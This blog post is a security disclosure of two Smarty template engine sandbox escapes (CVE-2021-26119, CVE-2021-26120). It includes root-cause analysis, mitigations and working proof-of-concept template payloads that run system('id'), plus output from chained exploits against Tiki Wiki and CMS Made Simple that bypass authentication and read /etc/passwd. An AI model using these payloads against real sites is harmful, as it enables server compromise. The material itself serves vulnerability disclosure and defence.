---
layout: post
title: "Smarty Template Engine Multiple Sandbox Escape PHP Code Injection Vulnerabilities"
date: 2021-02-18 08:00:00 -0500
categories: blog
---

In this blog post we explore two different sandbox escape vulnerabilities discovered in the [Smarty Template Engine](https://github.com/smarty-php/smarty) that can be leveraged by a context dependant attacker to execute arbitrary code. Then we explore how the vulnerabilities can be applyed to some applications that attempt to use the engine in a secure way.
<!--more-->

The discovered vulnerabilities are impact Smarty Template Engine <= 3.1.38:

**1. template_object Sandbox Escape PHP Code Injection**

This vulnerability targets an exposed and instantiated `Smarty` instance and is partially mitigated by using undocumented sandbox hardening features. It was [patched](https://github.com/smarty-php/smarty/commit/c9272058d972045dda9c99c64a82acb21c93c6ad) as CVE-2021-26119.

**2. Smarty_Internal_Runtime_TplFunction Sandbox Escape PHP Code Injection**

This vulnerability targets the compilation engine and is unmitigated in versions 3.1.38 and below (even with a hardended sandbox using undocumented features). It was [patched](https://github.com/smarty-php/smarty/commit/4f634c0097ab4a8b2adc2a97caacd1676e88f9c8) as CVE-2021-26120.

## Background

The following text is taken directly from the [Smarty website](https://www.smarty.net/about_smarty):

### What is Smarty?
> Smarty is a template engine for PHP, facilitating the separation of presentation (HTML/CSS) from application logic. This implies that PHP code is application logic, and is separated from the presentation.

### The Philosophy 
> The Smarty design was largely driven by these goals:
> - clean separation of presentation from application code
> - PHP backend, Smarty template frontend
> - complement PHP, not replace it
> - fast development/deployment for programmers and designers
> - quick and easy to maintain
> - syntax easy to understand, no PHP knowledge required
> - flexibility for custom development
> - **security: insulation from PHP**
> - free, open source

### Why is seperating PHP from templates important?
> **SANDBOXING: When PHP is mixed with templates, there are no restrictions on what type of logic can be injected into a template. Smarty insulates the templates from PHP, creating a controlled separation of presentation from business logic. Smarty also has security features that can further enforce granular restrictions on templates.**

## Environment

We have to assume an environment in which a template injection could occur. Many applications allow users to modify templates and given that Smarty clearly states that it has a sandbox it's likley that this functionality will be exposed as intended by developers. 

Granted that, there are two ways in which the author is aware that can lead to the injection of template syntax:

```php
$smarty->fetch($_GET['poc']);
$smarty->display($_GET['poc']);
```

### Vectors

Given what we have above senario and assuming a default secure mode is enabled then it's possible for an attacker to supply their own template code in the following ways:

```txt
/page.php?poc=resource:/path/to/template
/page.php?poc=resource:{your template code here}
```

The `resource:` will need to be a valid resource, some defaults provided are:

1. File

When using the `file:` resource, the code will pull from a local file. I still consider this a remote vector because many applications allow for a file upload and an attacker can provide a relative path or full path to the template file which means UNC paths also work under a Windows environment.

2. Eval

When using `eval:` your template code is simply evaluated in `Smarty_Resource_Recompiled` class. Note that this is *not* the same as a regular PHP eval.

3. String

When using the `string:` resource the code will write the template to disk first and then include it in `Smarty_Template_Compiled` class.

### Vulnerable Example

The proof of concepts presented here may target different sandbox configurations.

#### Default Sandbox

This page creates a new `Smarty` instance and enabled secure mode using the default settings:

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->enableSecurity();
$smarty->display($_GET['poc']);
```

#### Hardened Sandbox

A hardened sandbox page has been created that goes beyond the default sandbox to enable the most secure configuration that Smarty can provide:

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->php_functions = null;
$my_security_policy->php_handling = Smarty::PHP_REMOVE;
$my_security_policy->php_modifiers = null;
$my_security_policy->static_classes = null;
$my_security_policy->allow_super_globals = false;
$my_security_policy->allow_constants = false;
$my_security_policy->allow_php_tag = false;
$my_security_policy->streams = null;
$my_security_policy->php_modifiers = null;
$smarty->enableSecurity($my_security_policy);
$smarty->display($_GET['poc']);
```

## template_object Sandbox Escape PHP Code Injection

### Vulnerability Analysis

The fundemental root cause of this vulnerability is access to the `Smarty` instance from the `$smarty.template_object` super variable. 

Let's start with getting a reference to the `Smarty_Internal_Template` object. The `{$poc=$smarty.template_object}` value simply assigns the template object which is an instance of `Smarty_Internal_Template` to `$poc`. This generates the following code:

```php
$_smarty_tpl->_assignInScope('poc', $_smarty_tpl);
```

This is performed in the `compile` function within the `Smarty_Internal_Compile_Private_Special_Variable` class:

```php
case'template_object':
    return'$_smarty_tpl';
```

If we inspect the `$poc` object now, we can see it contains many interesting object properties:

```
object(Smarty_Internal_Template)#7 (24) {  
  ["_objType"]=>
  int(2)  
  ["smarty"]=>
  &object(Smarty)#1 (76) { ... }
  ["source"]=>
  object(Smarty_Template_Source)#8 (16) { ... }
  ["parent"]=>
  object(Smarty)#1 (76) { ... }
  ["ext"]=>
  object(Smarty_Internal_Extension_Handler)#10 (4) { ... }
  ["compiled"]=>
  object(Smarty_Template_Compiled)#11 (12) { ... }
```

The issue is here is that an attacker can access the `smarty` or `parent` property that will give them access to a Smarty instance.

### Exploitation

#### The Static Method Call Technique

So now that an attacker can access the `smarty` property, they can simply pass it as the third argument to the `Smarty_Internal_Runtime_WriteFile::writeFile` which will write an arbitrary file to disk (write what where primitive). This is the same technique performed by [James Kettle](https://www.youtube.com/watch?v=3cT0uE7Y87s) in 2015.

Having the ability to write arbitrary files to a targets filesystem is almost a guaranteed win but an attacker can never be too sure. Environments can vastly differ and writable directories in the webroot may not exist, .htaccess maybe blocking access to backdoors, etc.

Given that context, I came up with an application specific technique in which this vulnerability can be exploited for direct remote code execution without the need for these environment factors.

If using the `string:` resource, the `process` method inside of `Smarty_Template_Compiled` will be called which includes the compiled template file.

```php
    public function process(Smarty_Internal_Template $_smarty_tpl)
    {
        $source = &$_smarty_tpl->source;
        $smarty = &$_smarty_tpl->smarty;
        if ($source->handler->recompiled) {
            $source->handler->process($_smarty_tpl);
        } elseif (!$source->handler->uncompiled) {
            if (!$this->exists || $smarty->force_compile
                || ($_smarty_tpl->compile_check && $source->getTimeStamp() > $this->getTimeStamp())
            ) {
                $this->compileTemplateSource($_smarty_tpl);
                $compileCheck = $_smarty_tpl->compile_check;
                $_smarty_tpl->compile_check = Smarty::COMPILECHECK_OFF;
                $this->loadCompiledTemplate($_smarty_tpl);
                $_smarty_tpl->compile_check = $compileCheck;
            } else {
                $_smarty_tpl->mustCompile = true;
                @include $this->filepath; // overwrite this file and then include!
```

It's possible we can dynamically get access to this `filepath` property of the `Smarty_Template_Compiled` class so that we can use it as a location for the file write.

The nice thing about this technique is that the temporary location *must* be writable for the resource to work and it's platform independant. 

###### Proof of Concept

Using PHP's built in webserver and the supplied page from [Default Sandbox](#default-sandbox) as the target, run the following poc *twice*.

```txt
http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}
```

![static call exploitation](/assets/images/smarty-template-engine-multiple-sandbox-escape-php-code-injection-vulnerabilities/ee383bc0049942a4af666fd5954caa64.png)

The reason the request needs to be triggered twice is that the first time the cache file is written and then overwritten. The second time the cache is triggered and the file is included for remote code execution.

##### Mitigation

As a temporary workaround, the `static_classes` property can be nulled out in a custom security policy to prevent access to the `Smarty_Internal_Runtime_WriteFile` class. However, this comes at a cost and will heavily reduce functionality. For example, in the [Yii](https://www.yiiframework.com/extension/yiisoft/yii2-smarty/doc/guide/2.0/en/template-syntax) framework access to `Html::mailto`, `JqueryAsset::register` and other static method calls will not will not work.

```php
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->static_classes = null;
$smarty->enableSecurity($my_security_policy);
```

I don't consider this a complete mitigation since this is not enabled by default when turning secure mode on and doesn't address the root cause of the vulnerability.

#### The Sandbox Disabling Technique

Suppose we have a harder target that doesn't use the default security mode and instead attempts to define it's own security policy as with the [Hardened Sandbox](#hardened-sandbox) example. It's still possible to bypass this environment since we can get access to the `Smarty` instance and can use it to disable the sandbox and render our php code directly.

##### Proof of Concept

```txt
http://localhost:8000/page.php?poc=string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(\'id\')}')}
```

![property access and method call exploitation](/assets/images/smarty-template-engine-multiple-sandbox-escape-php-code-injection-vulnerabilities/11a277f9d6a24de682a01e9da4f09df0.png)

##### Mitigation

As a temporary workaround, the `disabled_special_smarty_vars` property can contain the an array with the string "template_object". 

However, this feature is completely [undocumented](https://www.smarty.net/docs/en/advanced.features.tpl#advanced.features.security). Below is an example of how to prevent the attack:

```php
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->disabled_special_smarty_vars = array("template_object");
$smarty->enableSecurity($my_security_policy);
```

Just like the [static method call technique](#the-static-method-call-technique), I don't consider this a complete mitigation since this is not enabled by default.

## Smarty_Internal_Runtime_TplFunction Sandbox Escape PHP Code Injection

### Vulnerability Analysis

When compiling template syntax, the `Smarty_Internal_Runtime_TplFunction` class does not filter the name property correctly when defining `tplFunctions`. Let's take a look at an example with the following template:

`{function name='test'}{/function}`

We can see that the compiler generates the following code:

```php
/* smarty_template_function_test_8782550315ffc7c00946f78_05745875 */
if (!function_exists('smarty_template_function_test_8782550315ffc7c00946f78_05745875')) {
    function smarty_template_function_test_8782550315ffc7c00946f78_05745875(Smarty_Internal_Template $_smarty_tpl,$params) {
	    foreach ($params as $key => $value) {
            $_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
        }
    }
}
/*/ smarty_template_function_test_8782550315ffc7c00946f78_05745875 */
```

The `test` string which is presumed controlled by the attacker is injected several times into the generated code. Notable examples are anything not within single quotes.

Since this is injected multiple times, I found it difficult to come up with a payload that would target the comment injection on the first line, so I opted for the function definition injection instead.

### Proof of Concept

Using PHP's built in webserver and the supplied page from [Hardened Sandbox](#hardened-sandbox) as the target, run the following poc:

```txt
http://localhost:8000/page.php?poc=string:{function+name='rce(){};system("id");function+'}{/function}
```

![function name injection](/assets/images/smarty-template-engine-multiple-sandbox-escape-php-code-injection-vulnerabilities/e6c4a9e8909c4a4bbc79e9fe5ff57597.png)

### Tiki Wiki 

When we combine CVE-2020-15906 and CVE-2021-26119 together, we can achieve unauthenticated remote code execution using [this exploit](/pocs/cve-2021-26119.py.txt):

```
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py <host> <path> <cmd>
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id

researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

### CMS Made Simple

When we combine CVE-2019-9053 and CVE-2021-26120 together, we can achieve unauthenticated remote code execution using [this exploit](/pocs/cve-2021-26120.py.txt):

```
researcher@incite:~/cmsms$ ./poc.py
(+) usage: ./poc.py <host> <path> <cmd>
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /cmsms/ "uname -a"

researcher@incite:~/cmsms$ ./poc.py 192.168.75.141 /cmsms/ "id;uname -a;pwd;head /etc/passwd"
(+) targeting http://192.168.75.141/cmsms/
(+) sql injection working!
(+) leaking the username...
(+) username: admin
(+) resetting the admin's password stage 1
(+) leaking the pwreset token...
(+) pwreset: 35f56698a2c3371eff7f38f34f001503
(+) done, resetting the admin's password stage 2
(+) logging in...
(+) leaking simplex template...
(+) injecting payload and executing cmd...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/cmsms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

## References

1. [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
2. [https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)